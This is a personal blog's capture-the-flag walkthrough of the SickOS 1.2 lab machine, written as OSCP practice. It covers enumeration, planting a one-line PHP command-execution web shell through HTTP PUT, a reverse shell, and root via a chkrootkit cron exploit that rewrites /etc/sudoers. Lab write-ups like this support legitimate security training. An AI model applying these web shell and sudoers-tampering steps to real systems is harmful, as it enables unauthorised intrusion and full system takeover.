<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="SickOS 1.2 a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next I ran threader3000 and let it run its recommended nmap scan."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Sick OS 1.2"><meta name=twitter:description content="SickOS 1.2 a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next I ran threader3000 and let it run its recommended nmap scan."><meta property="og:title" content="Sick OS 1.2"><meta property="og:description" content="SickOS 1.2 a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
Next I ran threader3000 and let it run its recommended nmap scan."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-08-19-sickos/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-08-19T00:00:00+00:00"><meta property="article:modified_time" content="2020-08-19T00:00:00+00:00"><title>Sick OS 1.2 · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-08-19-sickos/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a2eeff1d223fbc3bb6ff964c9089232ebb9cc98ec98ad5e666e532eccccce7b6.css integrity="sha256-ou7/HSI/vDu2/5ZMkIkjLrucyY7JitXmZuUy7MzM57Y=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.815859ce402d78e4e2074b80305c3b86578d026ab3055642afc27e110e03fac2.css integrity="sha256-gVhZzkAteOTiB0uAMFw7hleNAmqzBVZCr8J+EQ4D+sI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-08-19-sickos/>Sick OS 1.2</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-08-19T00:00:00Z>August 19, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/oscp/>OSCP</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/chkrootkit/>chkrootkit</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/privilege-escalation/>privilege escalation</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/curl/>curl</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/nmap-http-put/>nmap http-put</a></span></div></div></header><div><p><a href=https://www.vulnhub.com/entry/sickos-12,144/>SickOS 1.2</a> a vulnerable machine found on the <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">NetSecFocus Trophy Room</a> list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.</p><p>First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used <strong>netdiscover -i eth0</strong> until I came across the IP of this machine.</p><p><img src=/assets/img/SickOS1.png alt="SickOS 1.2 netdiscover"></p><p>Next I ran <strong>threader3000</strong> and let it run its recommended nmap scan.</p><p><img src=/assets/img/SickOS2.png alt="SickOS 1.2 threader3000 nmap"></p><p>It appears that SSH and HTTP are open. I pulled up the main website and was presented with the following.</p><p><img src=/assets/img/SickOS3.png alt="SickOS 1.2 website"></p><p>I decided to run <strong>gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.txt -t 50</strong> to enumerate the website. It uncovered a <strong>/test</strong> subdirectory.</p><p><img src=/assets/img/SickOS4.png alt="SickOS 1.2 gobuster"></p><p>I navigated to this page, and it appears to list contents of this directory, which has nothing in it.</p><p><img src=/assets/img/SickOS5.png alt="SickOS 1.2 /test"></p><p>I looked around and didn&rsquo;t see anything we could immediately exploit and there were not any other uncovered pages. I decided to use <strong>curl -X OPTIONS -v http://[machine ip]/test</strong> to see what was allowed in this directory. I uncovered that <strong>PUT</strong> was allowed.</p><p><img src=/assets/img/SickOS6.png alt="SickOS 1.2 curl"></p><p>With this discovery, I used <strong>nmap [machine ip] -p 80 &ndash;script http-put &ndash;script-args http-put.url=&rsquo;/test/shell.php&rsquo;, http-put.file=&rsquo;[location to reverse shell file]&rsquo;</strong>. I used the reverse shell from <a href=http://pentestmonkey.net/tools/web-shells/php-reverse-shell>PenTestMonkey</a>.</p><p><img src=/assets/img/SickOS7.png alt="SickOS 1.2 nmap http-put"></p><p>I then tested this with a reverse shell, but unfortunately it didn&rsquo;t work. I instead created a php file with <strong>&lt;?php $cmd=$_GET[&lsquo;cmd&rsquo;];system($cmd);?></strong> in it, and saved it as CommandExecution.php. I then uploaded it the same way I uploaded the reverse shell in the prior step.</p><p><img src=/assets/img/SickOS8.png alt="SickOS 1.2 nmap http-put 2"></p><p>Next, I opened a reverse shell listener on port 443 on my attacker computer.</p><p><img src=/assets/img/SickOS9.png alt="Sick OS 1.2 nc listener"></p><p>After trial and error, I discovered that running a Python reverse shell with the command injection script worked, and gave us an initial foothold on the victim PC.</p><p><img src=/assets/img/SickOS10.png alt="Sick OS 1.2 python reverse shell"></p><p>Next, I ran who and it revealed we have a shell as <strong>www-data</strong>, I then ran <strong>python -c &lsquo;import pty; ptw.spawn("/bin/sh")&rsquo;</strong> to upgrade my shell to a TTY shell.</p><p><img src=/assets/img/SickOS11.png alt="Sick OS 1.2 www-data shell"></p><p>Next, I tried navigating to the tmp directory and using wget to copy over linpeas for enumeration, but that was unsuccessful. However, we knew we could use nmap (as we had done twice earlier) to copy over files. I did this to copy over linpeas.</p><p><img src=/assets/img/SickOS12.png alt="Sick OS 1.2 nmap http-put 3"></p><p>Next, I ran <strong>chmod +x linpeas.sh</strong> to make linpeas executable and started it with <strong>./linpeas.sh</strong>.</p><p><img src=/assets/img/SickOS13.png alt="Sick OS 1.2 chmod +x"></p><p>Linpeas returned some interesting information.</p><p><img src=/assets/img/SickOS14.png alt="Sick OS 1.2 linpeas 1"></p><p><img src=/assets/img/SickOS15.png alt="Sick OS 1.2 linpeas 2"></p><p><img src=/assets/img/SickOS16.png alt="Sick OS 1.2 linpeas 3"></p><p>It appears that the kernel is exploitable and gcc is installed to compile exploits. <strong>chrootkit</strong> is also setup as a cron job and some versions are vulnerable to exploit. I ran <strong>chkrootkit -V</strong> to see the version that was installed.</p><p><img src=/assets/img/SickOS17.png alt="Sick OS 1.2 chkrootkit -V"></p><p>Back on our attacker pc, I ran <strong>searchsploit chkrootkit</strong>. One of the results returns the version that is installed on the victim machine!</p><p><img src=/assets/img/SickOS18.png alt="Sick OS 1.2 searchsploit chkrootkit"></p><p>Next, I ran <strong>searchsploit -x 33899</strong> to view the contents of this file. It tells you how to exploit **chkrootkit **.</p><p><img src=/assets/img/SickOS19.png alt="SickOS 1.2 searchsploit -x 33899"></p><p>I navigated to the tmp folder with <strong>cd /tmp</strong> and ran <strong>echo &ldquo;chmod 777 /etc/sudoers&rdquo; > update</strong> and made it executable with <strong>chmod +x update</strong>. I then waited a couple of minutes for this to be triggered.</p><p><img src=/assets/img/SickOS20.png alt="Sick OS 1.2 update file"></p><p>I then ran <strong>ls -al /etc |grep sudoers</strong>, which showed that the permissions on this file had been updated!</p><p><img src=/assets/img/SickOS21.png alt="Sick OS 1.2 ls -al /etc"></p><p>Next, I ran <strong>echo &ldquo;www-data ALL=NOPASSWD: ALL&rdquo; &#187; /etc/sudoers</strong> to give the www-data the ability to run anything as root with sudo with no password.</p><p><img src=/assets/img/SickOS22.png alt="Sick OS 1.2 modify /etc/sudoers"></p><p>Next, I ran <strong>sudo su</strong>, which didn&rsquo;t work because permissions on /etc/sudoers should be 440.</p><p><img src=/assets/img/SickOS23.png alt="Sick OS 1.2 sudo su failed"></p><p>Next, I went back to the /tmp directory and updated the update file with <strong>echo &ldquo;chmod 0440 /etc/sudoers&rdquo; > update</strong>. I waited a couple of minutes for this to take effect.</p><p><img src=/assets/img/SickOS24.png alt="Sick OS 1.2 modify update file"></p><p>I then ran <strong>ls -al /etc|grep sudoers</strong>, which showed the permissions had been changed back to the proper permissions. I then ran <strong>sudo su</strong> which gave me a root shell.</p><p><img src=/assets/img/SickOS25.png alt="Sick OS 1.2 modify sudoers permissions"></p><p>I then ran <strong>cd /root</strong> followed by <strong>ls -al</strong>. There was a flag file present, which I viewed the contents of with <strong>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</strong>, which showed the information below!</p><p><img src=/assets/img/SickOS26.png alt="Sick OS 1.2 root flag"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>